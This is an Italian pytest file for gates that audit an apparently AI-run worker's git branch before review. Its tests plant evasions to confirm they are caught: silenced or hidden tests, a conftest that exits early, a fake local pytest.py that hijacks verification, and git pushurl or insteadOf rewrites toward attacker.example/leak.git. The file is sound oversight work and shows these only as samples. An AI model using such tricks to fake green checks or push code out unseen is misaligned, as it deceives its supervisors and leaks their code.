"""I cancelli del motore su un ramo di unità: verdetti, motivi e pacchetto.

Repository git veri, rami veri, un remoto vero e nudo. La verifica la esegue il
motore con un interprete esplicito, così il test non dipende da quale `python`
sta su PATH.
"""
from __future__ import annotations

import json
import os
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

from nexgen_local import supervision_gates as gates
from nexgen_local import supervision_lint as lint
from nexgen_local import supervision_state as state
from nexgen_local import supervision_worktree as worktree

from supervision_repo import build, git_in

VERIFY_OK = f'"{sys.executable}" -c "print(1)"'
GATE_NAMES = (
    "confine",
    "file vietati",
    "integrità dei test",
    "prova per commit",
    "identità",
    "verifica indipendente",
    "test raccolti",
    "lint",
    "modello consentito",
    "configurazione git",
    "remoto intatto",
    "albero pulito",
)


@pytest.fixture
def lane(tmp_path, monkeypatch):
    monkeypatch.setattr(state, "lane_state_dir", lambda: tmp_path / "lane")
    return tmp_path / "lane" / "supervision"


@pytest.fixture
def repo(tmp_path):
    return build(tmp_path / "sandbox")


@pytest.fixture
def task(lane):
    return state.start("prova fase 2")["id"]


@pytest.fixture
def settings(lane):
    """L'elenco dei modelli consentiti, scritto dove la lane lo legge davvero."""
    def apply(patterns) -> None:
        (lane.parent / "config.json").write_text(
            json.dumps({"supervision": {"allowed_models": list(patterns)}}), encoding="utf-8",
        )

    return apply


def _unit(task, repo, tmp_path, *, allow=("docs/*.md",), verify=VERIFY_OK) -> Path:
    brief = tmp_path / "brief.md"
    brief.write_text("# Brief dell'unità prova\n\nSolo fatti.\n", encoding="utf-8")
    record = worktree.create(
        task, "prova", repo=repo.path, base="main", brief=str(brief),
        allow=list(allow), verify=verify,
    )
    return Path(record["worktree"])


def _write(folder: Path, name: str, text: str) -> None:
    target = folder / name
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(text, encoding="utf-8")


def _commit(folder: Path, message: str, files: dict[str, str]) -> None:
    for name, text in files.items():
        _write(folder, name, text)
    git_in(folder, "add", "-A")
    git_in(folder, "commit", "-q", "-m", message)


def _gate(result: dict, name: str) -> gates.GateResult:
    return next(item for item in result["gates"] if item.name == name)


def test_a_clean_unit_inside_its_boundary_passes(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nseconda riga aggiunta.\n"})

    result = gates.collect(task, "prova")

    assert result["verdict"] == "PASS"
    assert [item.name for item in result["gates"]] == list(GATE_NAMES)
    assert all(item.ok for item in result["gates"]), [str(item) for item in result["gates"]]
    package = Path(result["package"]).read_text(encoding="utf-8")
    assert "verdetto: PASS" in package
    assert "+seconda riga aggiunta." in package
    assert "docs/guida.md" in package
    assert "nessuna sessione agganciata" in package
    assert "## Test saltati su questa piattaforma" in package
    assert "nessun test saltato fra i file toccati" in package
    assert "## Voci di test_removal_ok aggiunte dall'unità" in package
    assert "nessuna voce aggiunta" in package
    raw = Path(result["raw"]).read_text(encoding="utf-8")
    assert "PASS confine" in raw
    collected = [row for row in state.read_events(task) if row.get("event") == "unit_collected"]
    assert collected[-1]["verdict"] == "PASS"


def test_a_session_on_a_model_outside_the_list_fails_the_gate(task, repo, tmp_path, settings, monkeypatch):
    """L'elenco c'è: il verdetto nomina il modello che non vi rientra."""
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga aggiunta.\n"})
    state.append_event(task, "attached", unit="prova", role="esecutore", harness="opencode", session="ses_finta")
    settings(["opencode-go/*"])
    monkeypatch.setattr(
        gates.costs, "measure", lambda session: SimpleNamespace(model="altro-provider/modello"),
    )

    result = gates.collect(task, "prova")

    assert result["verdict"] == "FAIL"
    gate = _gate(result, "modello consentito")
    assert not gate.ok
    assert "altro-provider/modello" in gate.reason
    assert "opencode-go/*" in gate.reason


def test_a_model_inside_the_list_passes_the_gate(task, repo, tmp_path, settings, monkeypatch):
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga aggiunta.\n"})
    state.append_event(task, "attached", unit="prova", role="esecutore", harness="opencode", session="ses_finta")
    settings(["opencode-go/*"])
    monkeypatch.setattr(
        gates.costs, "measure",
        lambda session: SimpleNamespace(model="opencode-go/deepseek-v4.1-flash#max"),
    )

    result = gates.collect(task, "prova")

    gate = _gate(result, "modello consentito")
    assert gate.ok
    assert "deepseek-v4.1-flash" in gate.reason


def test_a_model_nobody_can_read_fails_the_gate(task, repo, tmp_path, settings, monkeypatch):
    """«Non verificato» non è «consentito»: il cancello non promuove ciò che non ha letto."""
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga aggiunta.\n"})
    state.append_event(task, "attached", unit="prova", role="esecutore", harness="opencode", session="ses_finta")
    settings(["opencode-go/*"])

    def broken(session):
        raise gates.costs.CostError("export della sessione non riuscito")

    monkeypatch.setattr(gates.costs, "measure", broken)

    result = gates.collect(task, "prova")

    gate = _gate(result, "modello consentito")
    assert not gate.ok
    assert "non leggibile" in gate.reason


def test_a_file_outside_the_boundary_fails_and_is_named(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "feat: tocca altro", {"src/altro.py": "x = 1\n"})

    result = gates.collect(task, "prova")

    assert result["verdict"] == "FAIL"
    gate = _gate(result, "confine")
    assert not gate.ok
    assert "src/altro.py" in gate.reason


def test_touching_version_fails(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "chore: alza la versione", {"VERSION": "2.99.0\n"})

    result = gates.collect(task, "prova")

    forbidden = _gate(result, "file vietati")
    assert not forbidden.ok
    assert "VERSION" in forbidden.reason
    assert not _gate(result, "confine").ok, "VERSION non è nel confine dichiarato"
    assert result["verdict"] == "FAIL"


def test_a_forbidden_file_declared_in_the_boundary_is_allowed(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path, allow=["docs/*.md", "VERSION"])
    _commit(folder, "chore: alza la versione", {"VERSION": "2.99.0\n"})

    result = gates.collect(task, "prova")

    assert _gate(result, "file vietati").ok, "il confine lo dichiara, quindi non è un furto"


def test_a_renamed_version_file_fails_and_is_named_old_and_new(task, repo, tmp_path):
    """`git mv VERSION altro` è una modifica a VERSION: guardare solo il nome nuovo la nasconde."""
    repo.write("VERSION", "2.16.7\n")
    repo.commit("chore: la base ha un VERSION")
    repo.git("push", "-q", "origin", "main")
    folder = _unit(task, repo, tmp_path)
    git_in(folder, "mv", "VERSION", "versione-nascosta.txt")
    git_in(folder, "commit", "-q", "-m", "chore: sposta la versione")

    result = gates.collect(task, "prova")

    forbidden = _gate(result, "file vietati")
    assert not forbidden.ok
    assert "VERSION" in forbidden.reason
    assert result["verdict"] == "FAIL"


def test_a_weakened_test_fails_even_when_the_verification_is_green(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path, allow=["**"])
    _commit(folder, "test: toglie un test", {
        "tests/test_sample.py": "from module import value\n\ndef test_value():\n    assert value() == 1\n",
    })

    result = gates.collect(task, "prova")

    assert _gate(result, "verifica indipendente").ok, "la verifica dichiarata è verde"
    integrity = _gate(result, "integrità dei test")
    assert not integrity.ok
    assert "weakened" in integrity.reason
    assert result["verdict"] == "FAIL"


def test_a_fix_commit_without_a_failing_test_fails(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path, allow=["**"])
    _commit(folder, "fix: cambia il valore", {
        "module.py": "def value():\n    return 2\n",
        "tests/test_nuovo.py": "def test_nuovo():\n    assert 1 in (1, 2)\n",
    })

    result = gates.collect(task, "prova")

    per_commit = _gate(result, "prova per commit")
    assert not per_commit.ok
    assert "pass on the code before the fix" in per_commit.reason
    assert result["verdict"] == "FAIL"


def test_uncommitted_work_fails(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path)
    _write(folder, "docs/guida.md", "# guida\n\nsporca\n")

    result = gates.collect(task, "prova")

    clean = _gate(result, "albero pulito")
    assert not clean.ok
    assert "docs/guida.md" in clean.reason
    assert result["verdict"] == "FAIL"


def test_a_remote_that_advanced_for_another_reason_passes(task, repo, tmp_path):
    """Un ramo remoto che si muove per conto suo non è la prova di una spinta dell'unità."""
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})
    repo.git("push", "-q", "origin", "main:refs/heads/da-fuori")

    result = gates.collect(task, "prova")

    remote = _gate(result, "remoto intatto")
    assert remote.ok, remote.reason
    assert "nessun ref remoto porta un commit dell'unità" in remote.reason
    assert result["verdict"] == "PASS"


def test_a_remote_removed_from_the_copy_fails_and_is_named(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})
    git_in(folder, "remote", "remove", "origin")

    result = gates.collect(task, "prova")

    remote = _gate(result, "remoto intatto")
    assert not remote.ok
    assert "remoti spariti" in remote.reason
    assert "origin" in remote.reason
    assert result["verdict"] == "FAIL"


def test_a_pythonpath_from_the_engine_does_not_revive_the_copys_pytest(tmp_path, monkeypatch):
    """`-P` non tocca `PYTHONPATH`: senza ripulire l'ambiente il `pytest.py` della copia torna a girare."""
    folder = tmp_path / "copia"
    (folder / "tests").mkdir(parents=True)
    (folder / "tests" / "test_vero.py").write_text("def test_vero():\n    assert True\n", encoding="utf-8")
    marker = folder / "hijacked.txt"
    (folder / "pytest.py").write_text(
        "from pathlib import Path\n"
        f"Path({str(marker)!r}).write_text('eseguito', encoding='utf-8')\n"
        "raise SystemExit(0)\n",
        encoding="utf-8",
    )
    monkeypatch.setenv("PYTHONPATH", ".")

    result = gates._verify_gate(folder, f'"{sys.executable}" -m pytest -q')

    assert result.ok, result.reason
    assert not marker.exists(), "il pytest.py della copia non deve essere eseguito"


def test_the_creation_writes_down_the_configuration_fingerprint(task, repo, tmp_path):
    """L'impronta dei due file di configurazione è nel diario: senza, la raccolta non sa cosa confrontare."""
    _unit(task, repo, tmp_path)

    created = [row for row in state.read_events(task) if row.get("event") == "unit_created"][-1]

    assert len(created["config_hashes"]) == 2
    assert any(path.endswith("/.git/config") for path in created["config_hashes"])
    assert any(path.endswith("config.worktree") for path in created["config_hashes"])
    assert created["url_override_keys"] == []


def test_a_shared_git_config_touched_after_creation_fails_and_names_it(task, repo, tmp_path):
    """`git config` senza `--worktree` scrive il `.git/config` del proprietario, condiviso con ogni checkout."""
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})
    git_in(folder, "config", "alias.fp", "push --force")

    result = gates.collect(task, "prova")

    gate = _gate(result, "configurazione git")
    assert not gate.ok
    assert ".git/config" in gate.reason
    assert result["verdict"] == "FAIL"


def test_the_worktree_config_touched_after_creation_fails_and_names_it(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})
    git_in(folder, "config", "--worktree", "core.autocrlf", "false")

    result = gates.collect(task, "prova")

    gate = _gate(result, "configurazione git")
    assert not gate.ok
    assert "config.worktree" in gate.reason
    assert result["verdict"] == "FAIL"


def test_a_url_rewrite_added_after_creation_fails_and_names_the_key(task, repo, tmp_path):
    """`url.<base>.insteadOf` manda la push altrove mentre ogni URL della copia resta identico."""
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})
    git_in(folder, "config", "url.file:///tmp/leak.git.insteadOf", "nexgen-sup-disabled://push-blocked")

    result = gates.collect(task, "prova")

    gate = _gate(result, "configurazione git")
    assert not gate.ok
    assert "insteadof" in gate.reason.lower()
    assert "leak.git" in gate.reason
    assert result["verdict"] == "FAIL"


def test_a_url_rewrite_from_the_global_config_fails_without_touching_the_copy(
    task, repo, tmp_path, monkeypatch,
):
    """La regola può arrivare dal file globale: i due file della copia non cambiano e va vista lo stesso."""
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})
    global_config = tmp_path / "global.gitconfig"
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(global_config))
    global_config.write_text(
        '[url "file:///tmp/leak.git"]\n\tinsteadOf = nexgen-sup-disabled://push-blocked\n',
        encoding="utf-8",
    )

    result = gates.collect(task, "prova")

    gate = _gate(result, "configurazione git")
    assert not gate.ok
    assert "leak.git" in gate.reason
    assert "configurazione git cambiata" not in gate.reason, "i due file della copia sono intatti"
    assert result["verdict"] == "FAIL"


def test_a_remote_whose_url_changed_fails_and_names_it(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})
    git_in(folder, "remote", "set-url", "origin", str(tmp_path / "altro.git"))

    result = gates.collect(task, "prova")

    remote = _gate(result, "remoto intatto")
    assert not remote.ok
    assert "URL di fetch cambiato" in remote.reason
    assert "origin" in remote.reason
    assert result["verdict"] == "FAIL"


def test_a_changed_pushurl_fails_and_names_the_remote(task, repo, tmp_path):
    """`remote.<name>.pushurl` wins over the fetch URL: re-pointing it is how a push leaves unseen."""
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})
    git_in(folder, "config", "--worktree", "remote.origin.pushurl", "https://attacker.example/leak.git")

    result = gates.collect(task, "prova")

    remote = _gate(result, "remoto intatto")
    assert not remote.ok
    assert "pushurl cambiata" in remote.reason
    assert "origin" in remote.reason
    assert "attacker.example" in remote.reason
    assert result["verdict"] == "FAIL"


def test_a_remote_added_after_creation_fails_and_names_it(task, repo, tmp_path):
    """A remote the unit added is another way out of the copy, even with a blocked pushurl."""
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})
    git_in(folder, "remote", "add", "altro", str(tmp_path / "altro.git"))

    result = gates.collect(task, "prova")

    remote = _gate(result, "remoto intatto")
    assert not remote.ok
    assert "remoti aggiunti" in remote.reason
    assert "altro" in remote.reason
    assert result["verdict"] == "FAIL"


def test_a_unit_commit_that_reached_a_remote_fails_and_names_the_ref(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})
    git_in(folder, "push", "-q", str(repo.bare), "HEAD:refs/heads/fuga")

    result = gates.collect(task, "prova")

    remote = _gate(result, "remoto intatto")
    assert not remote.ok
    assert "origin/fuga" in remote.reason
    assert result["verdict"] == "FAIL"


def test_a_failing_verification_fails_and_keeps_its_output(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path, verify=f'"{sys.executable}" -c "import sys; sys.exit(3)"')
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})

    result = gates.collect(task, "prova")

    verify = _gate(result, "verifica indipendente")
    assert not verify.ok
    assert "esce con 3" in verify.reason
    assert result["verdict"] == "FAIL"


def test_a_unit_without_a_verification_command_is_not_verified(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path, verify="")
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})

    result = gates.collect(task, "prova")

    verify = _gate(result, "verifica indipendente")
    assert not verify.ok
    assert "nessun comando di verifica" in verify.reason


def test_a_verification_command_with_a_shell_operator_is_refused(task, repo, tmp_path):
    """Niente shell: `&&` non è supportato e il rifiuto arriva prima di eseguire."""
    folder = _unit(task, repo, tmp_path, verify=f'"{sys.executable}" -c "print(1)" && echo fatto')
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})

    result = gates.collect(task, "prova")

    verify = _gate(result, "verifica indipendente")
    assert not verify.ok
    assert "&&" in verify.reason
    assert "uno script o un solo comando" in verify.reason
    assert result["verdict"] == "FAIL"


@pytest.mark.parametrize("operator", ["&", "||"])
def test_a_windows_shell_operator_in_the_verification_is_refused(tmp_path, operator):
    """`&` and `||` join commands too: the verifier is one command, not a shell line."""
    folder = tmp_path / "copia"
    folder.mkdir()

    result = gates._verify_gate(folder, f'"{sys.executable}" -c "print(1)" {operator} echo fatto')

    assert not result.ok
    assert operator in result.reason
    assert "uno script o un solo comando" in result.reason


def test_a_python_verifier_cannot_import_the_copys_own_pytest(tmp_path):
    """`python -m pytest` puts the working directory first on `sys.path`: a local pytest.py answers."""
    folder = tmp_path / "copia"
    (folder / "tests").mkdir(parents=True)
    (folder / "tests" / "test_vero.py").write_text("def test_vero():\n    assert True\n", encoding="utf-8")
    marker = folder / "hijacked.txt"
    (folder / "pytest.py").write_text(
        "from pathlib import Path\n"
        f"Path({str(marker)!r}).write_text('eseguito', encoding='utf-8')\n"
        "raise SystemExit(0)\n",
        encoding="utf-8",
    )

    result = gates._verify_gate(folder, f'"{sys.executable}" -m pytest -q')

    assert result.ok, result.reason
    assert "esce con 0" in result.reason
    assert not marker.exists(), "il pytest.py della copia non deve essere eseguito"


def test_the_package_flags_a_touched_conftest(task, repo, tmp_path):
    """A conftest can turn tests off by changing collection: the reviewer must see it named."""
    folder = _unit(task, repo, tmp_path, allow=["**"])
    _commit(folder, "test: aggiunge una fixture", {
        "tests/conftest.py": "import pytest\n\n\n" + "@pytest.fixture\ndef valore():\n    return 1\n",
    })

    result = gates.collect(task, "prova")

    package = Path(result["package"]).read_text(encoding="utf-8")
    assert "configurazione di pytest toccata" in package
    assert "tests/conftest.py" in package


def test_the_package_flags_a_touched_pytest_section_in_pyproject(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path, allow=["**"])
    _commit(folder, "chore: cambia la configurazione di pytest", {
        "pyproject.toml": "[tool.pytest.ini_options]\ntestpaths = [\"tests\"]\n",
    })

    result = gates.collect(task, "prova")

    package = Path(result["package"]).read_text(encoding="utf-8")
    assert "configurazione di pytest toccata" in package
    assert "pyproject.toml" in package


def test_the_package_says_when_no_pytest_surface_was_touched(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})

    result = gates.collect(task, "prova")

    package = Path(result["package"]).read_text(encoding="utf-8")
    assert "nessun conftest.py o file di configurazione di pytest toccato" in package


def test_a_verification_executable_inside_the_copy_is_refused(task, repo, tmp_path):
    """Un esecutore non può fornire il proprio verificatore."""
    folder = worktree.worktree_path(task, "prova")
    _unit(task, repo, tmp_path, allow=["**"], verify=f'"{folder / "mio-verificatore"}" -c "print(1)"')
    _commit(folder, "chore: aggiunge un verificatore finto", {"mio-verificatore": "print('verde')\n"})

    result = gates.collect(task, "prova")

    verify = _gate(result, "verifica indipendente")
    assert not verify.ok
    assert "dentro la copia" in verify.reason
    assert result["verdict"] == "FAIL"


@pytest.mark.skipif(os.name != "nt", reason="Windows cerca l'eseguibile nella cartella prima del PATH")
def test_a_batch_named_like_the_runner_inside_the_copy_is_refused(task, repo, tmp_path):
    folder = worktree.worktree_path(task, "prova")
    _unit(task, repo, tmp_path, allow=["**"], verify="mio-pytest -q")
    _commit(folder, "chore: un pytest finto nella copia", {"mio-pytest.cmd": "@echo off\n"})

    result = gates.collect(task, "prova")

    verify = _gate(result, "verifica indipendente")
    assert not verify.ok
    assert "dentro la copia" in verify.reason


def test_the_package_carries_the_cost_measured_at_collection(task, repo, tmp_path, lane, monkeypatch):
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})
    state.append_jsonl(
        lane / task / state.COSTS_FILE,
        {"unit": "prova", "role": "esecutore", "session": "ses_uno", "cost_usd": 0.0,
         "tokens_in": 0, "tokens_out": 0},
    )
    monkeypatch.setattr(
        gates, "session_facts",
        lambda session: gates.costs.SessionFacts(
            cost_usd=0.25, tokens_in=100, tokens_out=10,
            created_ms=1_000_000, updated_ms=1_060_000,
        ),
    )

    result = gates.collect(task, "prova")

    package = Path(result["package"]).read_text(encoding="utf-8")
    assert "- costo: giro 0.2500 $, unità 0.2500 $, compito 0.2500 $ (modello non dichiarato)" in package
    assert result["cost"].round_usd == 0.25
    assert result["cost"].unit_usd == 0.25
    assert result["cost"].task_usd == 0.25


def test_a_cost_that_cannot_be_measured_at_collection_is_not_zero(task, repo, tmp_path, lane, monkeypatch):
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})
    state.append_jsonl(
        lane / task / state.COSTS_FILE,
        {"unit": "prova", "role": "esecutore", "session": "ses_uno", "cost_usd": 0.0},
    )

    def failing(session):
        raise gates.costs.CostError("l'export non risponde")

    monkeypatch.setattr(gates, "session_facts", failing)

    result = gates.collect(task, "prova")

    package = Path(result["package"]).read_text(encoding="utf-8")
    assert "- costo: non misurato (l'export non risponde)" in package
    assert "0.0000 $" not in package


def test_the_diff_in_the_package_is_cut_with_the_cut_declared(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path, allow=["**"])
    body = "\n".join(f"riga {number}" for number in range(gates.DIFF_MAX_LINES + 50))
    _commit(folder, "docs: un file lungo", {"docs/lungo.md": body + "\n"})

    result = gates.collect(task, "prova")

    package = Path(result["package"]).read_text(encoding="utf-8")
    assert "Diff troncato:" in package
    assert f"tetto dichiarato: {gates.DIFF_MAX_LINES} righe" in package


def test_an_unknown_unit_is_refused(task, repo, tmp_path):
    with pytest.raises(state.SupervisionError, match="unità sconosciuta"):
        gates.collect(task, "mai-creata")


def test_a_test_skipped_on_this_platform_is_named_in_the_package(task, repo, tmp_path):
    """Un test che qui viene saltato non è verificato: il pacchetto lo dice, con il motivo."""
    repo.write(
        "tests/test_posix.py",
        "import sys\nimport pytest\n\n"
        "@pytest.mark.skipif(sys.platform != 'un-altra-macchina', reason='solo sull\\'altra macchina')\n"
        "def test_solo_altrove():\n    assert False\n",
    )
    repo.commit("test: aggiunge un test che gira solo altrove")
    repo.git("push", "-q", "origin", "main")
    folder = _unit(task, repo, tmp_path, allow=["tests/*.py"])
    _commit(folder, "test: tocca il test saltato", {"tests/test_posix.py": (
        "import sys\nimport pytest\n\n"
        "@pytest.mark.skipif(sys.platform != 'un-altra-macchina', reason='solo sull\\'altra macchina')\n"
        "def test_solo_altrove():\n    assert False\n\n"
        "def test_aggiunto():\n    assert True\n"
    )})

    result = gates.collect(task, "prova")

    package = Path(result["package"]).read_text(encoding="utf-8")
    assert "## Test saltati su questa piattaforma" in package
    assert "tests/test_posix.py:4 (solo sull'altra macchina)" in package
    assert "non verificato su" in package
    raw = Path(result["raw"]).read_text(encoding="utf-8")
    assert "SKIPPED su questa piattaforma" in raw
    collected = [row for row in state.read_events(task) if row.get("event") == "unit_collected"]
    assert collected[-1]["skipped_tests"], "l'elenco resta anche nel diario"


def test_the_skip_listing_gives_pytest_a_worker_count_and_a_time_limit(monkeypatch, tmp_path):
    """Rieseguire i test toccati non deve poter durare senza fine: -n 4 e un tetto di tempo."""
    seen: dict = {}

    def fake_run(argv, **kwargs):
        seen.update({"argv": list(argv), "kwargs": kwargs})
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    monkeypatch.setattr(gates, "_worker_args", lambda: ["-n", "4"])
    monkeypatch.setattr(gates.subprocess, "run", fake_run)
    folder = tmp_path / "copia"
    folder.mkdir()

    gates.skipped_tests(folder, [SimpleNamespace(path="tests/test_x.py", status="M")])

    assert seen["argv"] == [
        sys.executable, "-m", "pytest", "-q", "-rs", "-n", "4", "tests/test_x.py",
    ]
    assert seen["kwargs"]["timeout"] == gates.SKIP_TIMEOUT_S


def test_the_worker_flags_follow_pytest_xdist(monkeypatch):
    monkeypatch.setattr(gates.importlib.util, "find_spec", lambda name: None)
    assert gates._worker_args() == []

    monkeypatch.setattr(gates.importlib.util, "find_spec", lambda name: object())
    assert gates._worker_args() == ["-n", "4"]


def test_a_repository_whose_rules_do_not_parse_is_refused_with_a_reason(task, repo, tmp_path):
    repo.write(".nexgen-discipline.toml", "review_paths = [unclosed\n")
    repo.commit("chore: rompe la configurazione")
    repo.git("push", "-q", "origin", "main")
    _ = _unit(task, repo, tmp_path)

    with pytest.raises(state.SupervisionError, match="cancelli non eseguibili"):
        gates.collect(task, "prova")


def test_a_vanished_copy_is_refused(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path)
    git_in(repo.path, "worktree", "remove", "--force", str(folder))

    with pytest.raises(state.SupervisionError, match="copia dell'unità sparita"):
        gates.collect(task, "prova")


def test_a_module_that_turns_its_tests_off_fails_the_collected_count(task, repo, tmp_path):
    """`__test__ = False` non tocca l'AST: i test ci sono ancora, pytest non ne raccoglie nessuno."""
    folder = _unit(task, repo, tmp_path, allow=["**"])
    _commit(folder, "test: spegne la raccolta", {
        "tests/test_sample.py": (
            "__test__ = False\n\nfrom module import value\n\n"
            "def test_value():\n    assert value() == 1\n\n"
            "def test_nome():\n    assert 'prova' == 'prova'\n"
        ),
    })

    result = gates.collect(task, "prova")

    gate = _gate(result, "test raccolti")
    assert not gate.ok
    assert "0 test" in gate.reason
    assert "2" in gate.reason, "il motivo dice quanti test raccoglieva la base"
    assert result["verdict"] == "FAIL"


def test_a_test_moved_into_a_hidden_folder_fails_the_collected_count(task, repo, tmp_path):
    """`tests/.hidden/` è un percorso di test per l'AST e una cartella che pytest salta."""
    folder = _unit(task, repo, tmp_path, allow=["**"])
    (folder / "tests" / ".hidden").mkdir()
    git_in(folder, "mv", "tests/test_sample.py", "tests/.hidden/test_sample.py")
    git_in(folder, "commit", "-q", "-m", "test: sposta in una cartella nascosta")

    result = gates.collect(task, "prova")

    gate = _gate(result, "test raccolti")
    assert not gate.ok
    assert "0 test" in gate.reason
    assert result["verdict"] == "FAIL"


def test_a_collect_ignore_in_a_conftest_fails_the_collected_count(task, repo, tmp_path):
    """`collect_ignore` spegne un file senza toccarne i test: il conteggio AST non lo vede."""
    folder = _unit(task, repo, tmp_path, allow=["**"])
    _commit(folder, "test: ignora un file di test", {
        "tests/conftest.py": "collect_ignore = ['test_sample.py']\n",
    })

    result = gates.collect(task, "prova")

    gate = _gate(result, "test raccolti")
    assert not gate.ok
    assert "0 test" in gate.reason
    assert "2" in gate.reason
    assert result["verdict"] == "FAIL"


def test_a_root_conftest_that_exits_fails_the_collected_count(task, repo, tmp_path):
    """Un `conftest.py` di radice che esce con 0 non esegue niente: la raccolta non ha un numero."""
    folder = _unit(task, repo, tmp_path, allow=["**"])
    _commit(folder, "chore: un conftest che esce", {"conftest.py": "import sys\nsys.exit(0)\n"})

    result = gates.collect(task, "prova")

    gate = _gate(result, "test raccolti")
    assert not gate.ok
    assert "non ha risposto" in gate.reason
    assert "2" in gate.reason, "il motivo dice quanti test raccoglieva la base"
    assert result["verdict"] == "FAIL"


def test_a_pytest_ini_that_prints_help_fails_the_collected_count(task, repo, tmp_path):
    """`addopts = --help` esce con 0 senza raccogliere: il cancello della verifica lo chiamerebbe verde."""
    folder = _unit(task, repo, tmp_path, allow=["**"])
    _commit(folder, "chore: cambia la configurazione di pytest", {
        "pytest.ini": "[pytest]\ntestpaths = tests\npythonpath = .\naddopts = --help\n",
    })

    result = gates.collect(task, "prova")

    gate = _gate(result, "test raccolti")
    assert not gate.ok
    assert "non ha risposto" in gate.reason
    assert result["verdict"] == "FAIL"


def test_a_new_test_is_an_increase_and_does_not_fail(task, repo, tmp_path):
    """Un test in più è normale: il cancello confronta, non impone l'uguaglianza."""
    folder = _unit(task, repo, tmp_path, allow=["**"])
    _commit(folder, "test: aggiunge un test", {"tests/test_nuovo.py": "def test_nuovo():\n    assert True\n"})

    result = gates.collect(task, "prova")

    gate = _gate(result, "test raccolti")
    assert gate.ok, gate.reason
    assert "3 test" in gate.reason
    assert "2" in gate.reason
    assert result["verdict"] == "PASS"


def test_a_unit_that_touches_no_test_has_nothing_to_compare(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})

    result = gates.collect(task, "prova")

    gate = _gate(result, "test raccolti")
    assert gate.ok, gate.reason
    assert "niente da confrontare" in gate.reason


def test_a_retirement_the_owner_authorised_on_the_base_passes(task, repo, tmp_path):
    """Il proprietario autorizza il file sulla base: il cancello della raccolta lo accetta e lo nomina.

    È la strada documentata da `nexgen_core/discipline/integrity.py`, e il cancello
    "test raccolti" la rispettava solo a metà: contava i test raccolti, non quali.
    """
    repo.write(".nexgen-discipline.toml", 'test_removal_ok = ["tests/test_sample.py"]\n')
    repo.commit("chore: autorizza il ritiro del campione")
    repo.git("push", "-q", "origin", "main")
    folder = _unit(task, repo, tmp_path, allow=["**"])
    (folder / "tests" / "test_sample.py").unlink()
    git_in(folder, "add", "-A")
    git_in(folder, "commit", "-q", "-m", "test: ritira il campione")

    result = gates.collect(task, "prova")

    gate = _gate(result, "test raccolti")
    assert gate.ok, gate.reason
    assert "2 test ritirati" in gate.reason
    assert "tests/test_sample.py" in gate.reason
    assert result["verdict"] == "PASS", [str(item) for item in result["gates"] if not item.ok]


# --- il permesso è del supervisore, e il pacchetto lo mostra -----------------


def test_a_unit_allowed_to_carry_the_rules_retires_across_two_commits(task, repo, tmp_path):
    """Il supervisore ha messo `.nexgen-discipline.toml` nel confine: l'unità autorizza, poi ritira."""
    folder = _unit(task, repo, tmp_path, allow=["**"])
    _commit(folder, "chore: autorizza il ritiro del campione", {
        ".nexgen-discipline.toml": 'test_removal_ok = ["tests/test_sample.py"]\n',
    })
    (folder / "tests" / "test_sample.py").unlink()
    git_in(folder, "add", "-A")
    git_in(folder, "commit", "-q", "-m", "test: ritira il campione")

    result = gates.collect(task, "prova")

